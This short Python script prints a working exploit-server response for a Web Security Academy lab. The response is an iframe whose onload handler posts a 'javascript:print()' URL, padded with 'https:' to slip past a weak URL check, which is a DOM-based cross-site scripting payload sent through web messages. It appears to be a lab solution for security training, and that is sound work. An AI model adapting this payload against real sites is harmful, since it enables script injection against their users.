LAB_ID = "???"

print("Exploit:")
print(f"""
HTTP/1.1 200
Content-Type: text/html; charset=utf-8
""")
print("Body:")
print(f"""
<iframe src="https://{LAB_ID}.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print(); console.log(\\'https:\\');','*')"></iframe>
""")

